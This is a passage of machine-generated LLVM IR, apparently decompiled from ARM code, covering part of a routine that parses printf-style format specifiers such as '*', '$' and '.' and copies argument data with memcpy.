  %v0_13504 = phi i32 [ %v5_13484, %dec_label_pc_134c0 ], [ %v0_133fc, %bb133 ], [ %v0_133fc, %dec_label_pc_13454 ], [ %v0_133fc, %dec_label_pc_133fc ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_134c0 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_13454 ], [ %stack_var_-48.1, %dec_label_pc_133fc ]
  %v1_134c4 = inttoptr i32 %v0_13504 to i8*
  %v2_134c4 = load i8, i8* %v1_134c4, align 1
  %v3_134c4 = zext i8 %v2_134c4 to i32
  store i32 %v3_134c4, i32* %r3.global-to-local, align 4
  %v7_134c8 = icmp eq i8 %v2_134c4, 42
  br i1 %v7_134c8, label %dec_label_pc_134d0, label %dec_label_pc_13514

dec_label_pc_134d0:                               ; preds = %dec_label_pc_134c4
  %v0_134d0 = load i32, i32* %sb.global-to-local, align 4
  %v2_134d0 = icmp eq i32 %v0_134d0, 0
  br i1 %v2_134d0, label %dec_label_pc_13504, label %dec_label_pc_134d8

dec_label_pc_134d8:                               ; preds = %dec_label_pc_134d0
  %v1_134d8 = inttoptr i32 %v1_13508 to i8*
  %v2_134d8 = load i8, i8* %v1_134d8, align 1
  %v3_134d8 = zext i8 %v2_134d8 to i32
  store i32 %v3_134d8, i32* %r3.global-to-local, align 4
  %v7_134dc = icmp eq i8 %v2_134d8, 36
  br i1 %v7_134dc, label %dec_label_pc_134e4, label %dec_label_pc_1378c

dec_label_pc_134e4:                               ; preds = %dec_label_pc_134d8
  %v0_134e4 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_134e4, 1
  br i1 %tmp134, label %dec_label_pc_1378c, label %dec_label_pc_134ec

dec_label_pc_134ec:                               ; preds = %dec_label_pc_134e4
  store i32 %v25_132f8, i32* %r1.global-to-local, align 4
  %v0_134f4 = load i32, i32* @lr, align 4
  %v3_134f4 = mul i32 %v0_134f4, -4
  %v4_134f4 = add i32 %v3_134f4, %v25_132f8
  store i32 %v4_134f4, i32* %r3.global-to-local, align 4
  %v1_134f8 = add i32 %v1_13508, 1
  store i32 %v1_134f8, i32* %r6.global-to-local, align 4
  %v2_134fc = add i32 %v4_134f4, -24
  %v3_134fc = inttoptr i32 %v2_134fc to i32*
  store i32 %v0_134e4, i32* %v3_134fc, align 4
  br label %dec_label_pc_13510

dec_label_pc_13504:                               ; preds = %dec_label_pc_134d0
  %v1_13504 = add i32 %v0_13504, 1
  store i32 %v1_13504, i32* %r3.global-to-local, align 4
  %v9_13508 = icmp eq i32 %v1_13504, %v1_13508
  br i1 %v9_13508, label %dec_label_pc_13510, label %dec_label_pc_1378c

dec_label_pc_13510:                               ; preds = %dec_label_pc_13504, %dec_label_pc_134ec
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13514

dec_label_pc_13514:                               ; preds = %dec_label_pc_134c4, %dec_label_pc_13510
  %v0_13514 = load i32, i32* @lr, align 4
  %v2_13514 = icmp eq i32 %v0_13514, 0
  br i1 %v2_13514, label %dec_label_pc_1351c, label %dec_label_pc_13334

dec_label_pc_1351c:                               ; preds = %dec_label_pc_13514
  %v0_1351c = load i32, i32* %r6.global-to-local, align 4
  %v1_1351c = inttoptr i32 %v0_1351c to i8*
  %v2_1351c = load i8, i8* %v1_1351c, align 1
  %v3_1351c = zext i8 %v2_1351c to i32
  store i32 %v3_1351c, i32* %r3.global-to-local, align 4
  %v7_13520 = icmp eq i8 %v2_1351c, 46
  br i1 %v7_13520, label %.thread22, label %dec_label_pc_13534

.thread22:                                        ; preds = %dec_label_pc_1351c
  %v2_13524 = add i32 %v0_1351c, 1
  store i32 %v2_13524, i32* %r6.global-to-local, align 4
  %v1_13528 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_13528, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_1339c

dec_label_pc_13534:                               ; preds = %dec_label_pc_1351c
  %v0_13534 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13534, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1353c

dec_label_pc_1353c:                               ; preds = %dec_label_pc_13334, %dec_label_pc_13534
  %v0_13544.pre = phi i32 [ %v0_1351c, %dec_label_pc_13534 ], [ %v0_13544.pre.pre, %dec_label_pc_13334 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_13534 ], [ %v0_13334, %dec_label_pc_13334 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_232d4.1063 to i32), i32* %r1.global-to-local, align 4
  %v1_13544 = inttoptr i32 %v0_13544.pre to i8*
  br label %dec_label_pc_13540

dec_label_pc_13540:                               ; preds = %dec_label_pc_13550, %dec_label_pc_1353c
  %v0_13550 = phi i32 [ %v1_13550, %dec_label_pc_13550 ], [ ptrtoint ([9 x i8]* @global_var_232d4.1063 to i32), %dec_label_pc_1353c ]
  %v1_13540 = inttoptr i32 %v0_13550 to i8*
  %v2_13540 = load i8, i8* %v1_13540, align 1
  %v3_13540 = zext i8 %v2_13540 to i32
  store i32 %v3_13540, i32* %r2.global-to-local, align 4
  %v2_13544 = load i8, i8* %v1_13544, align 1
  %v3_13544 = zext i8 %v2_13544 to i32
  store i32 %v3_13544, i32* %r3.global-to-local, align 4
  %v9_13548 = icmp eq i8 %v2_13544, %v2_13540
  br i1 %v9_13548, label %dec_label_pc_1333c, label %dec_label_pc_13550

dec_label_pc_13550:                               ; preds = %dec_label_pc_13540
  %v1_13550 = add i32 %v0_13550, 1
  %v2_13550 = inttoptr i32 %v1_13550 to i8*
  %v3_13550 = load i8, i8* %v2_13550, align 1
  %v4_13550 = zext i8 %v3_13550 to i32
  store i32 %v4_13550, i32* %r3.global-to-local, align 4
  store i32 %v1_13550, i32* %r1.global-to-local, align 4
  %v2_13554 = icmp eq i8 %v3_13550, 0
  br i1 %v2_13554, label %dec_label_pc_1355c, label %dec_label_pc_13540

dec_label_pc_1355c:                               ; preds = %dec_label_pc_13550, %dec_label_pc_1333c
  %v1_1357c = phi i32 [ %v1_1333c, %dec_label_pc_1333c ], [ %v0_13544.pre, %dec_label_pc_13550 ]
  %v1_13578 = phi i32 [ %v0_13550, %dec_label_pc_1333c ], [ %v1_13550, %dec_label_pc_13550 ]
  %v2_13560 = sub i32 %v1_13578, ptrtoint ([9 x i8]* @global_var_232d4.1063 to i32)
  store i32 %v2_13560, i32* %r3.global-to-local, align 4
  %v8_13568 = icmp sgt i32 %v2_13560, 1
  br i1 %v8_13568, label %.thread25, label %dec_label_pc_1356c

dec_label_pc_1356c:                               ; preds = %dec_label_pc_1355c
  %v1_1356c = inttoptr i32 %v1_1357c to i8*
  %v2_1356c = load i8, i8* %v1_1356c, align 1
  %v3_1356c = zext i8 %v2_1356c to i32
  store i32 %v3_1356c, i32* %r2.global-to-local, align 4
  %v1_13570 = inttoptr i32 %v1_13578 to i8*
  %v2_13570 = load i8, i8* %v1_13570, align 1
  %v3_13570 = zext i8 %v2_13570 to i32
  store i32 %v3_13570, i32* %r3.global-to-local, align 4
  %v9_13574 = icmp eq i8 %v2_1356c, %v2_13570
  br i1 %v9_13574, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_1356c
  %v2_13578 = add i32 %v1_13578, 9
  store i32 %v2_13578, i32* %r1.global-to-local, align 4
  %v2_1357c = add i32 %v1_1357c, 1
  store i32 %v2_1357c, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_1356c, %dec_label_pc_1355c, %bb135
  %v0_13584 = phi i32 [ %v1_13578, %dec_label_pc_1356c ], [ %v1_13578, %dec_label_pc_1355c ], [ %v2_13578, %bb135 ]
  %v0_13580 = phi i32 [ %v1_1357c, %dec_label_pc_1356c ], [ %v1_1357c, %dec_label_pc_1355c ], [ %v2_1357c, %bb135 ]
  %v1_13580 = inttoptr i32 %v0_13580 to i8*
  %v2_13580 = load i8, i8* %v1_13580, align 1
  %v3_13580 = zext i8 %v2_13580 to i32
  store i32 %v3_13580, i32* %r2.global-to-local, align 4
  %v1_13584 = add i32 %v0_13584, 9
  %v2_13584 = inttoptr i32 %v1_13584 to i8*
  %v3_13584 = load i8, i8* %v2_13584, align 1
  %v4_13584 = zext i8 %v3_13584 to i32
  store i32 %v4_13584, i32* %r3.global-to-local, align 4
  %v2_13588 = icmp eq i8 %v2_13580, 0
  %v3_1358c = mul nuw nsw i32 %v4_13584, 256
  store i32 %v3_1358c, i32* @lr, align 4
  br i1 %v2_13588, label %dec_label_pc_1378c, label %dec_label_pc_13594

dec_label_pc_13594:                               ; preds = %.thread25
  store i32 ptrtoint ([21 x i8]* @global_var_23314.1065 to i32), i32* %ip.global-to-local, align 4
  %v3_13598 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_13598, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1359c

dec_label_pc_1359c:                               ; preds = %dec_label_pc_13620, %dec_label_pc_13594
  %v1_135ac = phi i32 [ %v1_13620, %dec_label_pc_13620 ], [ ptrtoint ([21 x i8]* @global_var_23314.1065 to i32), %dec_label_pc_13594 ]
  %v1_1359c = inttoptr i32 %v1_135ac to i8*
  %v2_1359c = load i8, i8* %v1_1359c, align 1
  %v3_1359c = zext i8 %v2_1359c to i32
  store i32 %v3_1359c, i32* %r3.global-to-local, align 4
  %v9_135a0 = icmp eq i8 %v2_1359c, %v2_13580
  br i1 %v9_135a0, label %dec_label_pc_135a8, label %dec_label_pc_13620

dec_label_pc_135a8:                               ; preds = %dec_label_pc_1359c
  store i32 ptrtoint ([21 x i8]* @global_var_23314.1065 to i32), i32* %r3.global-to-local, align 4
  %v2_135ac = sub i32 %v1_135ac, ptrtoint ([21 x i8]* @global_var_23314.1065 to i32)
  store i32 %v2_135ac, i32* %r2.global-to-local, align 4
  %v7_135b4 = icmp slt i32 %v2_135ac, 18
  br i1 %v7_135b4, label %bb137, label %dec_label_pc_135b8

dec_label_pc_135b8:                               ; preds = %dec_label_pc_135a8
  %v1_135b8 = and i32 %v3_1358c, 1024
  %v2_135b8 = icmp eq i32 %v1_135b8, 0
  br i1 %v2_135b8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_135b8
  %v2_135bc = add i32 %v2_135ac, -2
  store i32 %v2_135bc, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_135a8, %dec_label_pc_135b8, %bb136
  %v0_135c0 = phi i32 [ %v2_135ac, %dec_label_pc_135a8 ], [ %v2_135ac, %dec_label_pc_135b8 ], [ %v2_135bc, %bb136 ]
  %v1_135c0 = load i32, i32* %r7.global-to-local, align 4
  %v2_135c0 = add i32 %v1_135c0, 32
  %v3_135c0 = inttoptr i32 %v2_135c0 to i32*
  store i32 %v0_135c0, i32* %v3_135c0, align 4
  store i32 ptrtoint (i32* @global_var_23307.1067 to i32), i32* %r1.global-to-local, align 4
  %v0_135cc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_135c8

dec_label_pc_135c8:                               ; preds = %dec_label_pc_135c8, %bb137
  %v0_135c8 = phi i32 [ %v1_135c8, %dec_label_pc_135c8 ], [ ptrtoint (i32* @global_var_23307.1067 to i32), %bb137 ]
  %v1_135c8 = add i32 %v0_135c8, 1
  %v2_135c8 = inttoptr i32 %v1_135c8 to i8*
  %v3_135c8 = load i8, i8* %v2_135c8, align 1
  %v4_135c8 = zext i8 %v3_135c8 to i32
  store i32 %v4_135c8, i32* %r3.global-to-local, align 4
  store i32 %v1_135c8, i32* %r1.global-to-local, align 4
  %v8_135d0 = icmp sgt i32 %v0_135cc.pre, %v4_135c8
  br i1 %v8_135d0, label %dec_label_pc_135c8, label %dec_label_pc_135d4

dec_label_pc_135d4:                               ; preds = %dec_label_pc_135c8
  store i32 ptrtoint (i32* @global_var_232f8.1071 to i32), i32* %r0.global-to-local, align 4
  %v2_135dc = sub i32 %v1_135c8, ptrtoint (i32* @global_var_23308.1069 to i32)
  %v2_135e0 = mul i32 %v2_135dc, 2
  store i32 %v2_135e0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_232e8.1073 to i32), i32* %ip.global-to-local, align 4
  %v2_135e8 = add i32 %v2_135e0, ptrtoint (i32* @global_var_232f8.1071 to i32)
  store i32 %v2_135e8, i32* %r2.global-to-local, align 4
  %v1_135ec = add i32 %v2_135e0, add (i32 ptrtoint (i32* @global_var_232f8.1071 to i32), i32 1)
  %v2_135ec = inttoptr i32 %v1_135ec to i8*
  %v3_135ec = load i8, i8* %v2_135ec, align 1
  %v4_135ec = zext i8 %v3_135ec to i32
  store i32 %v4_135ec, i32* %r1.global-to-local, align 4
  %v2_135f0 = add i32 %v2_135e0, ptrtoint (i32* @global_var_232e8.1073 to i32)
  store i32 %v2_135f0, i32* %r2.global-to-local, align 4
  %v3_135f4 = inttoptr i32 %v2_135e8 to i8*
  %v4_135f4 = load i8, i8* %v3_135f4, align 2
  %v6_135f4 = zext i8 %v4_135f4 to i32
  store i32 %v6_135f4, i32* %r0.global-to-local, align 4
  %v1_135f8 = add i32 %v2_135e0, add (i32 ptrtoint (i32* @global_var_232e8.1073 to i32), i32 1)
  %v2_135f8 = inttoptr i32 %v1_135f8 to i8*
  %v3_135f8 = load i8, i8* %v2_135f8, align 1
  %v4_135f8 = zext i8 %v3_135f8 to i32
  store i32 %v4_135f8, i32* %r2.global-to-local, align 4
  %v3_135fc = inttoptr i32 %v2_135f0 to i8*
  %v4_135fc = load i8, i8* %v3_135fc, align 2
  %v6_135fc = zext i8 %v4_135fc to i32
  %v3_13600 = mul nuw i32 %v4_135ec, 16777216
  store i32 %v3_13600, i32* %r1.global-to-local, align 4
  %v4_13604 = sdiv i32 %v3_13600, 65536
  %v5_13604 = or i32 %v6_135f4, %v4_13604
  %v3_13608 = mul nuw i32 %v4_135f8, 16777216
  store i32 %v3_13608, i32* %r2.global-to-local, align 4
  %v4_1360c = sdiv i32 %v3_13608, 65536
  %v5_1360c = or i32 %v6_135fc, %v4_1360c
  store i32 %v5_1360c, i32* %r3.global-to-local, align 4
  %v0_13610 = load i32, i32* @lr, align 4
  %v2_13610 = or i32 %v5_13604, %v0_13610
  store i32 ptrtoint ([21 x i8]* @global_var_23314.1065 to i32), i32* %ip.global-to-local, align 4
  %v2_13618 = and i32 %v2_13610, %v5_1360c
  store i32 %v2_13618, i32* %r0.global-to-local, align 4
  %v0_13634.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1362c

dec_label_pc_13620:                               ; preds = %dec_label_pc_1359c
  %v1_13620 = add i32 %v1_135ac, 1
  %v2_13620 = inttoptr i32 %v1_13620 to i8*
  %v3_13620 = load i8, i8* %v2_13620, align 1
  %v4_13620 = zext i8 %v3_13620 to i32
  store i32 %v4_13620, i32* %r3.global-to-local, align 4
  store i32 %v1_13620, i32* %ip.global-to-local, align 4
  %v2_13624 = icmp eq i8 %v3_13620, 0
  br i1 %v2_13624, label %dec_label_pc_1362c, label %dec_label_pc_1359c

dec_label_pc_1362c:                               ; preds = %dec_label_pc_13620, %dec_label_pc_135d4
  %v0_13638 = phi i32 [ %v0_13610, %dec_label_pc_135d4 ], [ %v3_1358c, %dec_label_pc_13620 ]
  %v0_13634 = phi i32 [ %v0_13634.pre, %dec_label_pc_135d4 ], [ %v0_13580, %dec_label_pc_13620 ]
  %v0_1362c = phi i32 [ %v2_13618, %dec_label_pc_135d4 ], [ %v3_13598, %dec_label_pc_13620 ]
  store i32 %v0_1362c, i32* %stack_var_-36, align 4
  %v0_13630 = load i32, i32* @r4, align 4
  %v1_13630 = and i32 %v0_13630, 4
  %v1_13634 = inttoptr i32 %v0_13634 to i8*
  %v2_13634 = load i8, i8* %v1_13634, align 1
  %v3_13634 = zext i8 %v2_13634 to i32
  store i32 %v3_13634, i32* %r1.global-to-local, align 4
  %v1_13638 = and i32 %v0_13638, 3840
  %v1_1363c = and i32 %v0_13630, -5
  %v2_13640 = or i32 %v1_1363c, %v1_13638
  store i32 %v2_13640, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_13630, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_13650 = load i32, i32* %r7.global-to-local, align 4
  %v2_13650 = add i32 %v1_13650, 12
  %v3_13650 = inttoptr i32 %v2_13650 to i32*
  store i32 %v3_13634, i32* %v3_13650, align 4
  %v0_13654 = load i32, i32* %r7.global-to-local, align 4
  %v1_13654 = add i32 %v0_13654, 4
  %v2_13654 = inttoptr i32 %v1_13654 to i32*
  %v3_13654 = load i32, i32* @r5, align 4
  store i32 %v3_13654, i32* %v2_13654, align 4
  %v4_13654 = add i32 %v0_13654, 8
  %v5_13654 = inttoptr i32 %v4_13654 to i32*
  %v6_13654 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_13654, i32* %v5_13654, align 4
  %v0_13658 = load i32, i32* %r3.global-to-local, align 4
  %v1_13658 = load i32, i32* %r7.global-to-local, align 4
  %v2_13658 = add i32 %v1_13658, 20
  %v3_13658 = inttoptr i32 %v2_13658 to i32*
  store i32 %v0_13658, i32* %v3_13658, align 4
  %v0_1365c = load i32, i32* %r2.global-to-local, align 4
  %v1_1365c = load i32, i32* %r7.global-to-local, align 4
  %v2_1365c = add i32 %v1_1365c, 16
  %v3_1365c = inttoptr i32 %v2_1365c to i32*
  store i32 %v0_1365c, i32* %v3_1365c, align 4
  %v0_13660 = load i32, i32* %r0.global-to-local, align 4
  %v1_13660 = load i32, i32* %r7.global-to-local, align 4
  %v2_13660 = add i32 %v1_13660, 28
  %v3_13660 = inttoptr i32 %v2_13660 to i32*
  store i32 %v0_13660, i32* %v3_13660, align 4
  %v0_13664 = load i32, i32* %ip.global-to-local, align 4
  %v1_13664 = inttoptr i32 %v0_13664 to i8*
  %v2_13664 = load i8, i8* %v1_13664, align 1
  %v3_13664 = zext i8 %v2_13664 to i32
  store i32 %v3_13664, i32* %r2.global-to-local, align 4
  %v2_13668 = icmp eq i8 %v2_13664, 0
  br i1 %v2_13668, label %dec_label_pc_13670, label %dec_label_pc_13688

dec_label_pc_13670:                               ; preds = %dec_label_pc_1362c
  %v0_13670 = load i32, i32* %r6.global-to-local, align 4
  %v1_13670 = inttoptr i32 %v0_13670 to i8*
  %v2_13670 = load i8, i8* %v1_13670, align 1
  %v3_13670 = zext i8 %v2_13670 to i32
  store i32 %v3_13670, i32* %r3.global-to-local, align 4
  %v7_13674 = icmp eq i8 %v2_13670, 109
  br i1 %v7_13674, label %dec_label_pc_1367c, label %dec_label_pc_1378c

dec_label_pc_1367c:                               ; preds = %dec_label_pc_13670
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_13680 = load i32, i32* %r7.global-to-local, align 4
  %v2_13680 = add i32 %v1_13680, 32
  %v3_13680 = inttoptr i32 %v2_13680 to i32*
  store i32 20, i32* %v3_13680, align 4
  %v0_13684 = load i32, i32* %r2.global-to-local, align 4
  %v1_13684 = load i32, i32* %r7.global-to-local, align 4
  %v2_13684 = add i32 %v1_13684, 28
  %v3_13684 = inttoptr i32 %v2_13684 to i32*
  store i32 %v0_13684, i32* %v3_13684, align 4
  br label %dec_label_pc_13688

dec_label_pc_13688:                               ; preds = %dec_label_pc_1362c, %dec_label_pc_1367c
  %v0_13688 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_13688, 1
  br i1 %tmp141, label %dec_label_pc_13740, label %dec_label_pc_13690

dec_label_pc_13690:                               ; preds = %dec_label_pc_13688
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13694

dec_label_pc_13694:                               ; preds = %dec_label_pc_13728, %dec_label_pc_13690
  %v8_136b0 = phi i32 [ 0, %dec_label_pc_13690 ], [ %v1_1372c, %dec_label_pc_13728 ]
  %v7_13698 = icmp sgt i32 %v8_136b0, 2
  br i1 %v7_13698, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_13694
  store i32 %v25_132f8, i32* %r2.global-to-local, align 4
  %v12_1369c = mul i32 %v8_136b0, 4
  %v13_1369c = add i32 %v12_1369c, %v25_132f8
  store i32 %v13_1369c, i32* %r3.global-to-local, align 4
  %v9_136a0 = add i32 %v13_1369c, -24
  %v10_136a0 = inttoptr i32 %v9_136a0 to i32*
  %v11_136a0 = load i32, i32* %v10_136a0, align 4
  store i32 %v11_136a0, i32* %r2.global-to-local, align 4
  %v9_136a4 = load i32, i32* %r7.global-to-local, align 4
  %v10_136a4 = add i32 %v9_136a4, %v8_136b0
  store i32 %v10_136a4, i32* %r3.global-to-local, align 4
  %v9_136ac = trunc i32 %v11_136a0 to i8
  %v11_136ac = add i32 %v10_136a4, 36
  %v12_136ac = inttoptr i32 %v11_136ac to i8*
  store i8 %v9_136ac, i8* %v12_136ac, align 1
  %v8_136b4 = load i32, i32* %r3.global-to-local, align 4
  %v9_136b4 = add i32 %v8_136b4, 36
  %v10_136b4 = inttoptr i32 %v9_136b4 to i8*
  %v11_136b4 = load i8, i8* %v10_136b4, align 1
  %v12_136b4 = zext i8 %v11_136b4 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_13694
  %v10_136b0 = add i32 %v8_136b0, %stack_var_-48.3
  store i32 %v10_136b0, i32* %r3.global-to-local, align 4
  %v9_136b8 = add i32 %v10_136b0, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_136dc = phi i32 [ %v12_136b4, %bb142 ], [ %v9_136b8, %bb143 ]
  store i32 %v0_136dc, i32* @r2, align 4
  %v1_136bc = load i32, i32* %sb.global-to-local, align 4
  %v2_136bc = sub i32 %v0_136dc, %v1_136bc
  %v4_136bc = xor i32 %v1_136bc, %v0_136dc
  %v5_136bc = xor i32 %v2_136bc, %v0_136dc
  %v6_136bc = and i32 %v5_136bc, %v4_136bc
  %v7_136bc = icmp slt i32 %v6_136bc, 0
  %v8_136bc = icmp slt i32 %v2_136bc, 0
  %v9_136bc = icmp eq i32 %v0_136dc, %v1_136bc
  %v3_136c0 = xor i1 %v8_136bc, %v7_136bc
  %v4_136c0 = or i1 %v9_136bc, %v3_136c0
  br i1 %v4_136c0, label %dec_label_pc_136d0, label %dec_label_pc_136c4

dec_label_pc_136c4:                               ; preds = %bb144
  %v1_136c4 = add i32 %v0_136dc, -9
  %v3_136c4 = sub i32 8, %v0_136dc
  %v4_136c4 = and i32 %v3_136c4, %v0_136dc
  %v5_136c4 = icmp slt i32 %v4_136c4, 0
  %v6_136c4 = icmp slt i32 %v1_136c4, 0
  %v7_136c4 = icmp eq i32 %v0_136dc, 9
  %v3_136c8 = xor i1 %v6_136c4, %v5_136c4
  %v4_136c8 = or i1 %v7_136c4, %v3_136c8
  br i1 %v4_136c8, label %dec_label_pc_136cc, label %dec_label_pc_1378c

dec_label_pc_136cc:                               ; preds = %dec_label_pc_136c4
  store i32 %v0_136dc, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_136d0

dec_label_pc_136d0:                               ; preds = %bb144, %dec_label_pc_136cc
  store i32 %v25_132f8, i32* %ip.global-to-local, align 4
  %v1_136d4 = load i32, i32* %r8.global-to-local, align 4
  %v4_136d4 = mul i32 %v1_136d4, 4
  %v5_136d4 = add i32 %v4_136d4, %v25_132f8
  store i32 %v5_136d4, i32* %r3.global-to-local, align 4
  %v1_136d8 = add i32 %v5_136d4, -12
  %v2_136d8 = inttoptr i32 %v1_136d8 to i32*
  %v3_136d8 = load i32, i32* %v2_136d8, align 4
  store i32 %v3_136d8, i32* %r5.global-to-local, align 4
  %v1_136dc = add i32 %v0_136dc, -1
  store i32 %v1_136dc, i32* %sl.global-to-local, align 4
  %v0_136e0 = load i32, i32* %r7.global-to-local, align 4
  %v4_136e0 = mul i32 %v1_136dc, 4
  %v5_136e0 = add i32 %v0_136e0, %v4_136e0
  store i32 %v5_136e0, i32* %r3.global-to-local, align 4
  %v7_136e4 = icmp eq i32 %v3_136d8, 8
  %v1_136e8 = add i32 %v5_136e0, 40
  %v2_136e8 = inttoptr i32 %v1_136e8 to i32*
  %v3_136e8 = load i32, i32* %v2_136e8, align 4
  store i32 %v3_136e8, i32* @r0, align 4
  br i1 %v7_136e4, label %dec_label_pc_13728, label %dec_label_pc_136f0

dec_label_pc_136f0:                               ; preds = %dec_label_pc_136d0
  %v9_136f0 = icmp eq i32 %v3_136e8, %v3_136d8
  br i1 %v9_136f0, label %dec_label_pc_13714, label %bb145

bb145:                                            ; preds = %dec_label_pc_136f0
  %v8_136f4 = icmp eq i32 %v3_136e8, 8
  br i1 %v8_136f4, label %dec_label_pc_13714, label %dec_label_pc_136fc

dec_label_pc_136fc:                               ; preds = %bb145
  %v0_136fc = call i32 @_promoted_size()
  %v0_13704 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13704, i32* @r0, align 4
  %v0_13708 = call i32 @_promoted_size()
  store i32 %v0_13708, i32* %r0.global-to-local, align 4
  %v8_13710 = icmp sgt i32 %v0_136fc, %v0_13708
  br i1 %v8_13710, label %dec_label_pc_13728, label %dec_label_pc_136fc.dec_label_pc_13714_crit_edge

dec_label_pc_136fc.dec_label_pc_13714_crit_edge:  ; preds = %dec_label_pc_136fc
  %v1_13718.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_13720.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_13720.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13714

dec_label_pc_13714:                               ; preds = %dec_label_pc_136fc.dec_label_pc_13714_crit_edge, %dec_label_pc_136f0, %bb145
  %v1_13720 = phi i32 [ %v1_13720.pre, %dec_label_pc_136fc.dec_label_pc_13714_crit_edge ], [ %v1_136dc, %dec_label_pc_136f0 ], [ %v1_136dc, %bb145 ]
  %v0_13720 = phi i32 [ %v0_13720.pre, %dec_label_pc_136fc.dec_label_pc_13714_crit_edge ], [ %v0_136e0, %dec_label_pc_136f0 ], [ %v0_136e0, %bb145 ]
  %v1_13718 = phi i32 [ %v1_13718.pre, %dec_label_pc_136fc.dec_label_pc_13714_crit_edge ], [ %v1_136d4, %dec_label_pc_136f0 ], [ %v1_136d4, %bb145 ]
  store i32 %v25_132f8, i32* %r1.global-to-local, align 4
  %v4_13718 = mul i32 %v1_13718, 4
  %v5_13718 = add i32 %v4_13718, %v25_132f8
  store i32 %v5_13718, i32* %r3.global-to-local, align 4
  %v1_1371c = add i32 %v5_13718, -12
  %v2_1371c = inttoptr i32 %v1_1371c to i32*
  %v3_1371c = load i32, i32* %v2_1371c, align 4
  store i32 %v3_1371c, i32* @r2, align 4
  %v4_13720 = mul i32 %v1_13720, 4
  %v5_13720 = add i32 %v4_13720, %v0_13720
  store i32 %v5_13720, i32* %r3.global-to-local, align 4
  %v2_13724 = add i32 %v5_13720, 40
  %v3_13724 = inttoptr i32 %v2_13724 to i32*
  store i32 %v3_1371c, i32* %v3_13724, align 4
  br label %dec_label_pc_13728

dec_label_pc_13728:                               ; preds = %dec_label_pc_136fc, %dec_label_pc_136d0, %dec_label_pc_13714
  %v0_13728 = load i32, i32* %r7.global-to-local, align 4
  %v1_13728 = add i32 %v0_13728, 28
  %v2_13728 = inttoptr i32 %v1_13728 to i32*
  %v3_13728 = load i32, i32* %v2_13728, align 4
  %v0_1372c = load i32, i32* %r8.global-to-local, align 4
  %v1_1372c = add i32 %v0_1372c, 1
  store i32 %v1_1372c, i32* %r8.global-to-local, align 4
  %v1_13730 = add i32 %v3_13728, 2
  store i32 %v1_13730, i32* %r3.global-to-local, align 4
  %v6_13738 = icmp slt i32 %v1_1372c, %v1_13730
  br i1 %v6_13738, label %dec_label_pc_13694, label %dec_label_pc_13758

dec_label_pc_13740:                               ; preds = %dec_label_pc_13688
  %v0_13740 = load i32, i32* %r7.global-to-local, align 4
  %v1_13740 = add i32 %v0_13740, 28
  %v2_13740 = inttoptr i32 %v1_13740 to i32*
  %v3_13740 = load i32, i32* %v2_13740, align 4
  store i32 %v3_13740, i32* %r2.global-to-local, align 4
  %v0_13744 = load i32, i32* %r0.global-to-local, align 4
  %v1_13744 = trunc i32 %v0_13744 to i8
  %v3_13744 = add i32 %v0_13740, 38
  %v4_13744 = inttoptr i32 %v3_13744 to i8*
  store i8 %v1_13744, i8* %v4_13744, align 1
  %v0_13748 = load i32, i32* %r2.global-to-local, align 4
  %v3_13748 = mul i32 %v0_13748, 4
  store i32 %v3_13748, i32* @r2, align 4
  %v0_1374c = load i32, i32* %r7.global-to-local, align 4
  %v1_1374c = add i32 %v0_1374c, 40
  store i32 %v1_1374c, i32* @r0, align 4
  %v2_13750 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13750, i32* @r1, align 4
  %v0_13754 = call i32 @memcpy()
  store i32 %v0_13754, i32* %r0.global-to-local, align 4
  %v0_13758.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13758

dec_label_pc_13758:                               ; preds = %dec_label_pc_13728, %dec_label_pc_13740
  %v2_13774 = phi i32 [ %v0_13758.pre, %dec_label_pc_13740 ], [ %v0_13728, %dec_label_pc_13728 ]
  %v1_13758 = add i32 %v2_13774, 16
  %v2_13758 = inttoptr i32 %v1_13758 to i32*
  %v3_13758 = load i32, i32* %v2_13758, align 4
  store i32 %v3_13758, i32* %r3.global-to-local, align 4
  %v1_1375c = and i32 %v3_13758, 128
  %v2_1375c = icmp eq i32 %v1_1375c, 0
  br i1 %v2_1375c, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_13758
  store i32 %v2_13300, i32* %r3.global-to-local, align 4
  %v2_13764 = inttoptr i32 %v2_13774 to i32*
